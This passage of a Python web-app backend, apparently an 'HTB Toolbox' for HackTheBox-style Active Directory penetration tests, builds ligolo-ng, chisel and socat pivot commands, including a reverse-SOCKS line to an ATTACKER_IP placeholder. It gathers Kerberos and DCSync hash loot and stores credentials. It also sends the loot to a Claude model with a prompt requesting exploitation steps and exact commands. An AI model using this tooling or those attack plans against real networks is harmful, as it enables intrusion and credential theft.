            f"    printf '%s\\n' \"$SUDO_PASS\" | sudo -S -p '' ip link set ligolo up 2>/dev/null || true; "
            f"  else "
            f"    sudo -n ip link set ligolo up 2>/dev/null || echo '[~] sudo requis pour activer l interface ligolo'; "
            f"  fi; "
            f"else "
            f"  if [ \"$(id -u)\" -eq 0 ]; then "
            f"    ip tuntap add user $(whoami) mode tun ligolo 2>/dev/null && ip link set ligolo up 2>/dev/null && echo '[+] Interface TUN ligolo créée'; "
            f"  elif [ -n \"${{SUDO_PASS:-}}\" ]; then "
            f"    printf '%s\\n' \"$SUDO_PASS\" | sudo -S -p '' ip tuntap add user $(whoami) mode tun ligolo 2>/dev/null && "
            f"    printf '%s\\n' \"$SUDO_PASS\" | sudo -S -p '' ip link set ligolo up 2>/dev/null && "
            f"    echo '[+] Interface TUN ligolo créée' || "
            f"    echo '[!] échec de création de l''interface ligolo malgré sudo'; "
            f"  else "
            f"    sudo -n ip tuntap add user $(whoami) mode tun ligolo 2>/dev/null && "
            f"    sudo -n ip link set ligolo up 2>/dev/null && "
            f"    echo '[+] Interface TUN ligolo créée' || "
            f"    echo '[!] sudo requis pour créer ligolo TUN : sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up'; "
            f"  fi; "
            f"fi; "
            f"LHOST=$(ip route get {qt} 2>/dev/null | grep -oP 'src \\K\\S+' | head -1); "
            f"LHOST=${{LHOST:-0.0.0.0}}; "
            f"echo ''; echo \"[*] Proxy ligolo-ng → 0.0.0.0:11601 (ton IP vers la cible : $LHOST)\"; "
            f"echo '[*] Commande agent Windows : agent.exe -connect '$LHOST':11601 -ignore-cert'; "
            f"echo '[*] Commande agent Linux   : ./agent -connect '$LHOST':11601 -ignore-cert'; "
            f"echo '[*] Console ligolo (après connexion agent) :'; "
            f"echo '      session                          → choisir la session'; "
            f"echo '      start                            → activer le tunnel'; "
            f"echo '      ip route add 172.16.X.0/24 dev ligolo  → ajouter route pivot'; "
            f"echo '      (Ctrl+C ici = stop proxy + tunnel)'; "
            f"echo ''; "
            f"ligolo-proxy -selfcert -laddr 0.0.0.0:11601 2>&1 | tee {qout}/attack_checks/ligolo_proxy.log"
        ] if t else None,

        "chisel_server": ["bash","-c",
            f"command -v chisel >/dev/null || {{ echo 'chisel introuvable — https://github.com/jpillora/chisel/releases'; exit 1; }}; "
            f"LHOST=$(ip route get {qt} 2>/dev/null | grep -oP 'src \\K\\S+' | head -1); "
            f"LHOST=${{LHOST:-0.0.0.0}}; "
            f"PORT=8888; "
            f"mkdir -p {qout}/attack_checks; "
            f"echo \"[*] Serveur chisel → $LHOST:$PORT (SOCKS5 sur 127.0.0.1:1080)\"; "
            f"echo \"[*] Commande client (cible) : chisel client $LHOST:$PORT R:socks\"; "
            f"echo \"[*] proxychains4 / ProxyChains config : socks5 127.0.0.1 1080\"; "
            f"chisel server --port $PORT --reverse --socks5 2>&1 | tee {qout}/attack_checks/chisel_server.log"
        ] if t else None,

        "chisel_client": ["bash","-c",
            f"LHOST=$(ip route get {qt} 2>/dev/null | grep -oP 'src \\K\\S+' | head -1); "
            f"LHOST=${{LHOST:-ATTACKER_IP}}; "
            f"echo '══ Hint : commande à exécuter sur la cible ══'; "
            f"echo \"chisel client $LHOST:8888 R:socks\"; "
            f"echo ''; "
            f"echo '══ Ou forward de port direct ══'; "
            f"echo \"chisel client $LHOST:8888 R:445:{qt}:445\"; "
            f"echo \"chisel client $LHOST:8888 R:3389:{qt}:3389\"; "
            f"echo ''; "
            f"echo '══ Config proxychains (/etc/proxychains4.conf) ══'; "
            f"echo 'socks5 127.0.0.1 1080'"
        ] if t else None,

        "socat_fwd": ["bash","-c",
            f"command -v socat >/dev/null || {{ echo 'socat manquant — apt install socat'; exit 1; }}; "
            f"mkdir -p {qout}/attack_checks; "
            f"echo '══ Choix du forward socat (Ctrl+C pour arrêter) ══'; "
            f"echo '  1) SMB   4445 → {qt}:445'; "
            f"echo '  2) RDP  13389 → {qt}:3389'; "
            f"echo '  3) WinRM 15985 → {qt}:5985'; "
            f"echo '  4) LDAP  3890 → {qt}:389'; "
            f"echo ''; "
            f"echo '[*] Démarrage forward SMB 4445 → {qt}:445 (Ctrl+C = stop)'; "
            f"echo '[*] Pour un autre port, arrête et relance depuis le terminal intégré'; "
            f"echo ''; "
            f"socat -v TCP-LISTEN:4445,reuseaddr,fork TCP:{qt}:445 2>&1 | tee {qout}/attack_checks/socat_fwd.log"
        ] if t else None,
    }

    return cmds.get(tool_id)

# ── AI Analysis ───────────────────────────────────────────────────────
def collect_loot_for_analysis(out_dir: "Path | None", subfolder: str = "") -> str:
    """Collecte les fichiers loot pertinents pour l'analyse IA."""
    if not out_dir or not out_dir.exists():
        return ""

    MAX_FILE_SIZE = 8000
    MAX_TOTAL = 100000
    parts: list[str] = []
    total = 0

    def add_file(path: Path, label: str = "") -> None:
        nonlocal total
        if total >= MAX_TOTAL or not path.exists() or path.stat().st_size == 0:
            return
        try:
            content = path.read_text(errors="replace")[:MAX_FILE_SIZE]
            name = label or str(path.relative_to(out_dir))
            chunk = f"\n=== [{name}] ===\n{content}\n"
            parts.append(chunk)
            total += len(chunk)
        except Exception:
            pass

    # Analyse d'un sous-dossier spécifique
    if subfolder:
        target_dir = out_dir / subfolder
        if target_dir.exists():
            parts.append(f"# Analyse du sous-dossier: {subfolder} (domaine: {out_dir.name})\n")
            for f in sorted(target_dir.rglob("*")):
                if f.is_file() and f.stat().st_size > 0 and total < MAX_TOTAL:
                    add_file(f)
        return "".join(parts)

    # Analyse complète du loot
    parts.append(f"# Loot d'audit — Domaine: {out_dir.name}\n")

    for rel in [
        "nmapresult.txt", "users.txt",
        "hosts_discovery/discovered_hosts.txt",
        "smb_shares/shares_target.txt",
        "kerberos/asrep_hashes.txt",
        "kerberos/tgs_hashes.txt",
        "attack_checks/secretsdump_dcsync.txt",
        "attack_checks/postauth_hints.txt",
        "relay_hints/ntlm_relay_commands.txt",
        "enum4linux/passpol.txt",
        "ldap_asrep_candidates.txt",
        "ldap_admincount.txt",
        "ldap_pwdneverexpires.txt",
        "attack_checks/nxc_probe.txt",
        "dns_enum/axfr.txt",
        "attack_checks/gpp_hits.txt",
    ]:
        add_file(out_dir / rel, rel)

    # Résumés JSON parsés (findings uniquement)
    parsed_dir = out_dir / "parsed"
    if parsed_dir.exists():
        for f in sorted(parsed_dir.glob("*.json")):
            if total >= MAX_TOTAL:
                break
            try:
                data = json.loads(f.read_text())
                findings = data.get("findings", {})
                preview = data.get("output_preview", "")[:2000]
                if any([findings.get("asrep_hashes"), findings.get("kerberoast_hashes"),
                        findings.get("ntlm_hashes"), findings.get("smb_signing_disabled"),
                        findings.get("adcs_esc"), findings.get("winrm_open")]) or preview:
                    chunk = (f"\n=== [parsed/{f.name}] ===\n"
                             f"Findings: {json.dumps(findings)}\n"
                             f"Preview:\n{preview}\n")
                    parts.append(chunk)
                    total += len(chunk)
            except Exception:
                pass

    # Résultats ADCS et BloodyAD
    for d in ["adcs", "bloodyad"]:
        sub = out_dir / d
        if sub.exists():
            for f in sorted(sub.rglob("*.txt"))[:4]:
                add_file(f, f"{d}/{f.name}")

    return "".join(parts)


# ── Export Markdown ────────────────────────────────────────────────────
def generate_markdown(domain: str) -> str:
    out_dir = get_output_dir(domain)
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    md = [f"# HTB Toolbox — {domain}\n\nGénéré le {now}\n"]

    if timeline:
        md.append("## Timeline\n")
        md.append("| Heure | Tool | Durée | RC |")
        md.append("|-------|------|-------|----|")
        for e in timeline:
            ts  = datetime.fromtimestamp(e["start"]).strftime("%H:%M:%S")
            dur = f"{e.get('duration',0):.1f}s"
            rc  = "✅" if e.get("rc",1) == 0 else "❌"
            md.append(f"| {ts} | `{e['tool_id']}` | {dur} | {rc} |")
        md.append("")

    key_files = [
        ("users.txt",                           "## Users"),
        ("kerberos/asrep_hashes.txt",           "## AS-REP Hashes (hashcat -m 18200)"),
        ("kerberos/tgs_hashes.txt",             "## TGS Hashes (hashcat -m 13100)"),
        ("attack_checks/secretsdump_dcsync.txt","## NTLM Hashes — DCSync"),
        ("nmapresult.txt",                      "## Nmap"),
        ("smb_shares/shares_target.txt",        "## SMB Shares"),
        ("enum4linux/passpol.txt",              "## Password Policy"),
        ("attack_checks/postauth_hints.txt",    "## Post-auth Commands"),
        ("relay_hints/ntlm_relay_commands.txt", "## NTLM Relay"),
    ]
    for rel, title in key_files:
        fp = out_dir / rel
        if fp.exists() and fp.stat().st_size > 0:
            md += [title + "\n", "```",
                   fp.read_text(errors="replace")[:3000].rstrip(), "```\n"]
    return "\n".join(md)


def _inline_md(text: str) -> str:
    text = html.escape(text)
    text = re.sub(r"`([^`]+)`", r"<code>\1</code>", text)
    text = re.sub(r"\*\*([^*]+)\*\*", r"<strong>\1</strong>", text)
    return text


def render_markdown_document(md_text: str, title: str) -> str:
    lines = md_text.splitlines()
    body: list[str] = []
    in_code = False
    list_kind: str | None = None
    para: list[str] = []

    def flush_para():
        nonlocal para
        if para:
            body.append(f"<p>{_inline_md(' '.join(p.strip() for p in para))}</p>")
            para = []

    def close_list():
        nonlocal list_kind
        if list_kind:
            body.append(f"</{list_kind}>")
            list_kind = None

    for raw in lines:
        line = raw.rstrip("\n")
        stripped = line.strip()
        if in_code:
            if stripped.startswith("```"):
                body.append("</code></pre>")
                in_code = False
            else:
                body.append(html.escape(line) + "\n")
            continue
        if stripped.startswith("```"):
            flush_para()
            close_list()
            body.append("<pre><code>")
            in_code = True
            continue
        if not stripped:
            flush_para()
            close_list()
            continue
        if stripped.startswith("### "):
            flush_para()
            close_list()
            body.append(f"<h3>{_inline_md(stripped[4:])}</h3>")
            continue
        if stripped.startswith("## "):
            flush_para()
            close_list()
            body.append(f"<h2>{_inline_md(stripped[3:])}</h2>")
            continue
        if stripped.startswith("# "):
            flush_para()
            close_list()
            body.append(f"<h1>{_inline_md(stripped[2:])}</h1>")
            continue
        if re.match(r"^\d+\.\s+", stripped):
            flush_para()
            if list_kind != "ol":
                close_list()
                list_kind = "ol"
                body.append("<ol>")
            body.append(f"<li>{_inline_md(re.sub(r'^\\d+\\.\\s+', '', stripped))}</li>")
            continue
        if stripped.startswith("- "):
            flush_para()
            if list_kind != "ul":
                close_list()
                list_kind = "ul"
                body.append("<ul>")
            body.append(f"<li>{_inline_md(stripped[2:])}</li>")
            continue
        para.append(stripped)

    flush_para()
    close_list()
    if in_code:
        body.append("</code></pre>")

    return f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>{html.escape(title)}</title>
  <style>
    :root {{
      --bg:#0b0f14; --panel:#121922; --text:#e6edf3; --muted:#9aa6b2; --line:#233041; --accent:#4fd1c5;
    }}
    body {{ margin:0; background:var(--bg); color:var(--text); font:15px/1.65 ui-sans-serif, system-ui, sans-serif; }}
    .wrap {{ max-width:980px; margin:0 auto; padding:28px 22px 80px; }}
    .top {{ display:flex; gap:12px; align-items:center; justify-content:space-between; margin-bottom:24px; flex-wrap:wrap; }}
    .title {{ font-size:14px; color:var(--muted); }}
    .actions a {{ color:var(--accent); text-decoration:none; border:1px solid var(--line); padding:8px 12px; border-radius:8px; background:var(--panel); }}
    h1,h2,h3 {{ line-height:1.25; margin:26px 0 12px; }}
    h1 {{ font-size:30px; }}
    h2 {{ font-size:22px; border-top:1px solid var(--line); padding-top:18px; }}
    h3 {{ font-size:18px; }}
    p, ul, ol {{ margin:12px 0; }}
    ul,ol {{ padding-left:22px; }}
    code {{ background:#182230; padding:2px 6px; border-radius:6px; }}
    pre {{ background:#0f1620; border:1px solid var(--line); padding:14px; border-radius:10px; overflow:auto; }}
    pre code {{ background:none; padding:0; }}
    strong {{ color:#fff; }}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="top">
      <div class="title">{html.escape(title)}</div>
      <div class="actions"><a href="/">HTB Toolbox</a></div>
    </div>
    {''.join(body)}
  </div>
</body>
</html>"""

# ── WebSocket ──────────────────────────────────────────────────────────
@app.websocket("/ws")
async def ws_endpoint(ws: WebSocket):
    global active_proc, active_tool_id, active_run_procs, active_run_tasks, shell_proc, shell_master_fd, shell_reader_task
    await ws.accept()
    send_lock = asyncio.Lock()

    async def send(t: str, d: dict):
        async with send_lock:
            try:
                await ws.send_text(json.dumps({"type": t, **d}))
            except Exception:
                pass

    async def run_tool_job(tool_id: str, cfg: dict):
        nonlocal send
        global active_run_procs, active_run_tasks
        out_dir = get_output_dir(cfg.get("domain",""))
        out_dir.mkdir(parents=True, exist_ok=True)
        for sub in SUBDIRS + ["kerberos"]:
            (out_dir / sub).mkdir(exist_ok=True)

        cmd = build_command(tool_id, cfg)
        if cmd is None:
            await send("tool_output", {"tool_id": tool_id,
                "line": f"[!] Credentials manquants ou outil indisponible: {tool_id}",
                "done": True, "rc": 1})
            active_run_tasks.pop(tool_id, None)
            return

        pw, nt = cfg.get("password",""), cfg.get("nt_hash","")
        sp = cfg.get("sudo_password","")
        def mask(s):
            return mask_text(s, pw, nt, sp)
        cmd_disp = display_command(cmd, cfg, pw, nt, sp)
        await send("tool_output", {"tool_id": tool_id,
            "line": f"[CMD] {cmd_disp}",
            "done": False, "rc": None})
        run_cmd_base, timeout_budget = apply_timeout_budget(tool_id, cmd)
        if timeout_budget:
            await send("tool_output", {"tool_id": tool_id,
                "line": f"[*] Timeout de securite applique: {timeout_budget}s",
                "done": False, "rc": None})

        entry = {"tool_id": tool_id, "start": time.time(), "rc": None, "duration": 0}
        timeline.append(entry)
        output_chunks: list[str] = []
        output_len = 0

        try:
            sub_env = build_shell_env(cfg)
            sub_env["PYTHONUNBUFFERED"] = "1"
            run_cmd = (["stdbuf", "-oL", "-eL"] + run_cmd_base) if shutil.which("stdbuf") else run_cmd_base
            proc = await asyncio.create_subprocess_exec(
                *run_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
                env=sub_env,
                cwd=str(out_dir),
                start_new_session=True)
            active_run_procs[tool_id] = proc
            t0 = time.monotonic()
            async for raw in proc.stdout:
                line = mask(raw.decode("utf-8", errors="replace").rstrip())
                if output_len < MAX_CAPTURE_CHARS:
                    remaining = MAX_CAPTURE_CHARS - output_len
                    clipped = line[:remaining]
                    output_chunks.append(clipped)
                    output_len += len(clipped) + 1
                await send("tool_output", {"tool_id": tool_id,
                    "line": line, "done": False, "rc": None})
            await proc.wait()
            dur = round(time.monotonic()-t0, 2)
            entry["rc"] = proc.returncode
            entry["duration"] = dur
            if proc.returncode == 124:
                timeout_msg = "[!] Timeout atteint — outil arrêté par la borne de temps de sécurité."
                if output_len < MAX_CAPTURE_CHARS:
                    remaining = MAX_CAPTURE_CHARS - output_len
                    clipped = timeout_msg[:remaining]
                    output_chunks.append(clipped)
                    output_len += len(clipped) + 1
                await send("tool_output", {"tool_id": tool_id,
                    "line": timeout_msg, "done": False, "rc": None})
            _persist_timeline()
            result_path = persist_module_result(tool_id, cfg, entry, "\n".join(output_chunks), out_dir)
            await send("tool_output", {"tool_id": tool_id,
                "line": f"[RESULT] {result_path.relative_to(LOOT_DIR)}",
                "done": False, "rc": None})
            await send("tool_output", {"tool_id": tool_id,
                "line": None, "done": True,
                "rc": proc.returncode, "duration": dur})
            detected = _detect_new_creds(out_dir, cfg)
            if detected:
                await send("cred_detected", detected)
            if tool_id in ("nmap_baseline", "nmap_targeted") and proc.returncode == 0:
                nmap_txt = out_dir / "nmapresult.txt"
                if nmap_txt.exists():
                    ports = _parse_open_ports(nmap_txt)
                    if ports:
                        await send("nmap_ports", {"ports": ports})
            elif tool_id == "rustscan_fast" and proc.returncode == 0:
                rs_txt = out_dir / "rustscan.txt"
                if rs_txt.exists():
                    try:
                        text = rs_txt.read_text(errors="replace")
                        import re as _re
                        nums = sorted({int(m) for m in _re.findall(r"Open\s+[\d.]+:(\d+)", text)})
                        if nums:
                            ports = [{"port": f"{n}/tcp", "service": "?", "state": "open"} for n in nums]
                            await send("nmap_ports", {"ports": ports})
                    except Exception:
                        pass
        except asyncio.CancelledError:
            raise
        except FileNotFoundError as e:
            entry["rc"] = 127
            _persist_timeline()
            persist_module_result(tool_id, cfg, entry, str(e), out_dir)
            await send("tool_output", {"tool_id": tool_id,
                "line": f"[!] Binaire introuvable: {e}",
                "done": True, "rc": 127})
        finally:
            active_run_procs.pop(tool_id, None)
            active_run_tasks.pop(tool_id, None)

    async def close_shell():
        nonlocal send
        global shell_proc, shell_master_fd, shell_reader_task
        if shell_reader_task:
            shell_reader_task.cancel()
            shell_reader_task = None
        if shell_proc and shell_proc.poll() is None:
            try:
                shell_proc.terminate()
            except Exception:
                pass
        shell_proc = None
        if shell_master_fd is not None:
            try:
                os.close(shell_master_fd)
            except OSError:
                pass
        shell_master_fd = None

    async def start_shell(cfg: dict):
        nonlocal send
        global shell_proc, shell_master_fd, shell_reader_task
        if shell_proc and shell_proc.poll() is None and shell_master_fd is not None:
            await send("shell_state", {"status": "ready"})
            return

        await close_shell()
        out_dir = get_output_dir(cfg.get("domain", ""))
        cwd = str(out_dir if out_dir.exists() else BASE_DIR)
        master_fd, slave_fd = pty.openpty()
        env = build_shell_env(cfg)
        env["INPUTRC"] = "/dev/null"

        def _shell_preexec():
            os.setsid()
            fcntl.ioctl(slave_fd, termios.TIOCSCTTY, 0)

        proc = subprocess.Popen(
            ["bash", "--noprofile", "--norc", "-i", "-c", "bind 'set enable-bracketed-paste off' >/dev/null 2>&1; exec bash --noprofile --norc -i"],
            stdin=slave_fd,
            stdout=slave_fd,
            stderr=slave_fd,
            cwd=cwd,
            env=env,
            close_fds=True,
            preexec_fn=_shell_preexec,
        )
        os.close(slave_fd)
        shell_proc = proc
        shell_master_fd = master_fd
        await send("shell_state", {"status": "started", "cwd": cwd})

        async def reader():
            global shell_proc, shell_master_fd, shell_reader_task
            secrets = [cfg.get("password",""), cfg.get("nt_hash",""), cfg.get("sudo_password","")]
            loop = asyncio.get_running_loop()
            try:
                while shell_proc and shell_proc.poll() is None and shell_master_fd is not None:
                    data = await loop.run_in_executor(None, os.read, shell_master_fd, 4096)
                    if not data:
                        await asyncio.sleep(0.05)
                        continue
                    await send("shell_chunk", {"data": mask_text(
                        data.decode("utf-8", errors="replace"),
                        *secrets,
                        strip_ansi=False
                    )})
            except Exception:
                pass
            rc = shell_proc.returncode if shell_proc else 0
            await send("shell_state", {"status": "stopped", "rc": rc})
            if shell_master_fd is not None:
                try:
                    os.close(shell_master_fd)
                except OSError:
                    pass
            shell_master_fd = None
            shell_proc = None
            shell_reader_task = None

        shell_reader_task = asyncio.create_task(reader())

    try:
        while True:
            msg = json.loads(await ws.receive_text())
            action = msg.get("action")

            if action == "ping":
                target = msg.get("target","")
                if not target:
                    await send("pong", {"reachable": False, "latency": None}); continue
                t0 = time.monotonic()
                proc = await asyncio.create_subprocess_exec(
                    "ping","-c","1","-W","2", target,
                    stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
                await proc.wait()
                lat = round((time.monotonic()-t0)*1000)
                await send("pong", {"reachable": proc.returncode==0,
                                    "latency": lat if proc.returncode==0 else None})

            elif action == "check_tools":
                await send("tools_status", {"tools": check_tools()})

            elif action == "run_tool":
                tool_id = msg.get("tool_id","")
                cfg     = normalize_cfg(msg.get("cfg",{}))
                if tool_id in active_run_tasks:
                    await send("tool_output", {"tool_id": tool_id,
                        "line": f"[!] Déjà en cours: {tool_id}",
                        "done": True, "rc": 1})
                    continue
                active_run_tasks[tool_id] = asyncio.create_task(run_tool_job(tool_id, cfg))

            elif action == "preview_tool":
                tool_id = msg.get("tool_id","")
                raw_cfg = msg.get("cfg",{}) if isinstance(msg.get("cfg",{}), dict) else {}
                cfg     = normalize_cfg(raw_cfg)
                sp      = str(raw_cfg.get("sudo_password","") or "")
                cmd     = build_command(tool_id, cfg)
                if cmd is None:
                    await send("preview_result", {"tool_id": tool_id, "ok": False,
                        "reason": "Commande indisponible (cible/paramètres manquants ?)"})
                    continue
                pw, nt = cfg.get("password",""), cfg.get("nt_hash","")
                if len(cmd) >= 3 and cmd[0] in ("bash","sh") and cmd[1] == "-c":
                    body = mask_text(cmd[2], pw, nt, sp)
                    raw  = f"{cmd[0]} -c {shell_quote(body)}"
                    summary = display_command(cmd, cfg, pw, nt, sp)
                else:
                    raw = mask_text(" ".join(cmd), pw, nt, sp)
                    summary = raw
                await send("preview_result", {"tool_id": tool_id, "ok": True,
                    "command": raw, "summary": summary})

            elif action == "shell_start":
                cfg = normalize_cfg(msg.get("cfg", {}))
                await start_shell(cfg)

            elif action == "shell_input":
                chars = msg.get("chars", "")
                if shell_master_fd is None or not shell_proc or shell_proc.poll() is not None:
                    cfg = normalize_cfg(msg.get("cfg", {}))
                    await start_shell(cfg)
                if shell_master_fd is not None and chars:
                    os.write(shell_master_fd, chars.encode("utf-8", errors="replace"))

            elif action == "shell_sigint":
                if shell_master_fd is not None:
                    os.write(shell_master_fd, b"\x03")

            elif action == "shell_close":
                await close_shell()
                await send("shell_state", {"status": "closed"})

            elif action == "stop":
                stopped_tool = active_tool_id
                stopped_tools = await terminate_all_runs()
                if active_proc and active_proc.returncode is None:
                    try:
                        await terminate_active_process(active_proc)
                    except Exception:
                        pass
                try:
                    await cleanup_tool_processes(stopped_tool)
                except Exception:
                    pass
                active_proc = None
                active_tool_id = None
                await send("stopped", {"tool_id": stopped_tool, "tool_ids": stopped_tools})

            elif action == "get_timeline":
                await send("timeline_data", {"entries": timeline})

            elif action == "clear_timeline":
                timeline.clear()
                _persist_timeline()
                await send("timeline_data", {"entries": []})

            elif action == "reset_session":
                current_cfg = normalize_cfg(msg.get("cfg", {}))
                stopped_tool = active_tool_id
                await terminate_all_runs()
                if active_proc and active_proc.returncode is None:
                    try:
                        await terminate_active_process(active_proc)
                    except Exception:
                        pass
                try:
                    await cleanup_tool_processes(stopped_tool)
                except Exception:
                    pass
                active_proc = None
                active_tool_id = None
                await close_shell()

                timeline.clear()
                _persist_timeline()

                existing = load_saved_config()
                reset_cfg = {
                    "target_type": existing.get("target_type") or "windows",
                    "op_mode": existing.get("op_mode") or DEFAULT_OP_MODE,
                    "target": "",
                    "domain": "",
                    "dc": "",
                    "user": "",
                    "password": "",
                    "nt_hash": "",
                    "ccache": "",
                    "claude_api_key": existing.get("claude_api_key", ""),
                    "web_port": existing.get("web_port", "80"),
                    "ssh_port": existing.get("ssh_port", "22"),
                    "notes": "",
                }
                save_user_config(reset_cfg)
                await send("session_reset", {
                    "cfg": reset_cfg,
                })

            elif action == "get_hashes":
                domain = normalize_cfg({"domain": msg.get("domain","")}).get("domain","")
                hdir = get_output_dir(domain)
                sources = {
                    "asrep": hdir / "kerberos" / "asrep_hashes.txt",
                    "tgs":   hdir / "kerberos" / "tgs_hashes.txt",
                    "ntlm":  hdir / "attack_checks" / "secretsdump_dcsync.txt",
                    "sam":   hdir / "attack_checks" / "secretsdump_sam.txt",
                }
                hashes = {}
                for key, fp in sources.items():
                    if fp.exists() and fp.stat().st_size > 0:
                        hashes[key] = safe_read_text(fp, 60000)
                await send("hashes_data", {"hashes": hashes})

            elif action == "get_creds":
                domain = normalize_cfg({"domain": msg.get("domain","")}).get("domain","")
                creds_path = get_output_dir(domain) / "creds.json"
                creds = json.loads(creds_path.read_text()) if creds_path.exists() else []
                await send("creds_data", {"creds": creds})

            elif action == "save_cred":
                domain = normalize_cfg({"domain": msg.get("domain","")}).get("domain","")
                odir = get_output_dir(domain)
                odir.mkdir(parents=True, exist_ok=True)
                creds_path = odir / "creds.json"
                creds = json.loads(creds_path.read_text()) if creds_path.exists() else []
                cred = {k: v for k, v in (msg.get("cred") or {}).items() if isinstance(v, str)}
                if cred:
                    cred["id"] = str(int(time.time() * 1000))
                    creds.append(cred)
                    creds_path.write_text(json.dumps(creds, indent=2))
                await send("creds_data", {"creds": creds})

            elif action == "delete_cred":
                domain = normalize_cfg({"domain": msg.get("domain","")}).get("domain","")
                creds_path = get_output_dir(domain) / "creds.json"
                creds = json.loads(creds_path.read_text()) if creds_path.exists() else []
                creds = [c for c in creds if c.get("id") != msg.get("id","")]
                creds_path.write_text(json.dumps(creds, indent=2))
                await send("creds_data", {"creds": creds})

            elif action == "list_loot":
                domain = normalize_cfg({"domain": msg.get("domain","")}).get("domain","")
                await send("loot_list", {"files": list_loot_files(domain)})

            elif action == "list_history":
                await send("history_list", {"entries": list_history_entries()})

            elif action == "read_file":
                try:
                    fp = resolve_loot_path(msg.get("path",""))
                    content = fp.read_text(errors="replace")[:80000]
                    await send("file_content", {"path": str(msg.get("path","")), "content": content})
                except Exception as e:
                    await send("file_content", {"path": "", "content": f"[erreur] {e}"})

            elif action == "get_results_summary":
                domain = normalize_cfg({"domain": msg.get("domain","")}).get("domain","")
                await send("results_summary", summarize_domain_results(domain))

            elif action == "reanalyze_loot":
                domain = normalize_cfg({"domain": msg.get("domain","")}).get("domain","")
                manual = bool(msg.get("manual"))
                meta = analyze_loot_artifacts(domain)
                await send("loot_reanalysis", {"ok": True, "manual": manual, **meta})
                await send("results_summary", summarize_domain_results(domain))
                await send("loot_list", {"files": list_loot_files(domain)})

            elif action == "load_notes":
                domain = normalize_cfg({"domain": msg.get("domain","")}).get("domain","")
                if not domain:
                    await send("notes_loaded", {"domain":"", "content":"", "saved_at": None})
                    continue
                notes_path = get_output_dir(domain) / "notes.md"
                content = ""
                saved_at = None
                if notes_path.exists():
                    try:
                        content = notes_path.read_text(encoding="utf-8")
                        saved_at = notes_path.stat().st_mtime
                    except Exception:
                        content = ""
                await send("notes_loaded", {"domain": domain, "content": content, "saved_at": saved_at})

            elif action == "save_notes":
                domain = normalize_cfg({"domain": msg.get("domain","")}).get("domain","")
                content = str(msg.get("content","") or "")
                if len(content) > 200_000:
                    await send("notes_saved", {"ok": False, "domain": domain, "error": "Notes trop longues (>200 Ko)"})
                    continue
                if not domain:
                    await send("notes_saved", {"ok": False, "domain": "", "error": "Domaine manquant — saisis une cible dans la config."})
                    continue
                out_dir = get_output_dir(domain)
                out_dir.mkdir(parents=True, exist_ok=True)
                notes_path = out_dir / "notes.md"
                try:
                    notes_path.write_text(content, encoding="utf-8")
                    await send("notes_saved", {"ok": True, "domain": domain, "saved_at": notes_path.stat().st_mtime})
                except Exception as e:
                    await send("notes_saved", {"ok": False, "domain": domain, "error": str(e)[:300]})

            elif action == "save_run_manifest":
                cfg = normalize_cfg(msg.get("cfg", {}))
                manifest = msg.get("manifest", {}) if isinstance(msg.get("manifest", {}), dict) else {}
                manifest_path = persist_run_manifest(cfg, manifest)
                await send("tool_output", {"tool_id": "run_manifest",
                    "line": f"[MANIFEST] {manifest_path.relative_to(LOOT_DIR)}",
                    "done": True, "rc": 0})

            elif action == "export_markdown":
                domain = normalize_cfg({"domain": msg.get("domain","")}).get("domain","")
                md = generate_markdown(domain)
                out_dir = get_output_dir(domain)
                out_dir.mkdir(parents=True, exist_ok=True)
                md_path = out_dir / "report.md"
                md_path.write_text(md)
                await send("markdown_export", {
                    "path": str(md_path.relative_to(LOOT_DIR)),
                    "content": md})

            elif action == "ai_analyze":
                api_key  = msg.get("api_key", "").strip()
                domain   = normalize_cfg({"domain": msg.get("domain","")}).get("domain","")
                subfolder = msg.get("subfolder","").strip().replace("..", "").strip("/")

                if not api_key:
                    await send("ai_error", {"message": "Clé API Claude manquante."})
                    continue

                out_dir = get_output_dir(domain) if domain else None
                context = collect_loot_for_analysis(out_dir, subfolder)

                if not context.strip():
                    await send("ai_error", {
                        "message": f"Aucun fichier loot trouvé pour '{domain}'. Lance d'abord des scans."
                    })
                    continue

                try:
                    import anthropic as _anthropic
                    client = _anthropic.AsyncAnthropic(api_key=api_key)

                    system_prompt = (
                        "Tu es un expert en tests d'intrusion spécialisé dans les environnements "
                        "Active Directory, Kerberos, et les challenges HackTheBox/CTF. "
                        "Analyse le loot fourni et produis un rapport d'audit structuré en français "
                        "avec les sections suivantes :\n\n"
                        "1. **Résumé exécutif** : hôtes découverts, services ouverts, domaine AD\n"
                        "2. **Utilisateurs et comptes** : comptes, privilèges, AdminCount, "
                        "mots de passe non expirants\n"
                        "3. **Vecteurs d'attaque identifiés** : AS-REP Roasting, Kerberoasting, "
                        "SMB Relay, ADCS ESC1-13, Pass-the-Hash, délégations, ACLs abusables\n"
                        "4. **Chemin d'exploitation recommandé** : étapes numérotées et concrètes\n"
                        "5. **Credentials et hachés** : hachés NT, tickets Kerberos, mots de passe clairs\n"
                        "6. **Commandes à exécuter** : commandes exactes avec les bons paramètres\n"
                        "7. **Prochaines étapes d'énumération** : ce qui manque et comment l'obtenir\n\n"
                        "Sois direct, précis et actionnable. Priorise les attaques avec le meilleur "
                        "ratio impact/facilité. Formate avec du Markdown."
                    )

                    await send("ai_start", {"domain": domain, "subfolder": subfolder})

                    async with client.messages.stream(
                        model="claude-opus-4-6",
                        max_tokens=8192,
                        thinking={"type": "adaptive"},
                        system=system_prompt,
                        messages=[{"role": "user", "content":
                                   f"Voici le loot collecté :\n\n{context}"}]
                    ) as stream:
                        async for text in stream.text_stream:
                            await send("ai_chunk", {"text": text})

                    await send("ai_done", {})

                except ImportError:
                    await send("ai_error", {
                        "message": "Module 'anthropic' non installé. "
                                   "Relance ./install.sh --with-ai"
                    })
                except Exception as e:
                    await send("ai_error", {"message": str(e)[:500]})

            elif action == "save_config":
                cfg = normalize_cfg(msg.get("cfg",{}))
                extra = msg.get("cfg",{}) if isinstance(msg.get("cfg", {}), dict) else {}
                cfg["claude_api_key"] = str(extra.get("claude_api_key", "") or "").strip()
                cfg["notes"] = str(extra.get("notes", "") or "").strip()[:1000]
                save_user_config(cfg)
                await send("config_saved", {})

            elif action == "sync_hosts":
